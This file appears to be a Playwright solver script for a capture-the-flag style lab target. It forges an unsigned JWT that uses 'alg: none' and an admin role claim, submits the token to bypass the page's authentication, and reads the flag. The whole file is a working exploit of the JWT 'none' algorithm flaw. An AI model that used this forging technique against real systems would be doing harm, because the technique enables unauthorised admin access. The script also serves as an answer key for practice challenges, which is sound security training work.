import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/04-nought-alg-none.html");
  const forged = await page.evaluate(() => {
    const encode = (
      window as unknown as Window & { noughtEncode(value: unknown): string }
    ).noughtEncode;

    return [
      encode({ typ: "JWT", alg: "none" }),
      encode({ name: "Audit", role: "admin", badge: "black" }),
      "",
    ].join(".");
  });
  await page.fill("#token", forged);
  await page.click("#submit");
  return page.locator("#flag").textContent();
}
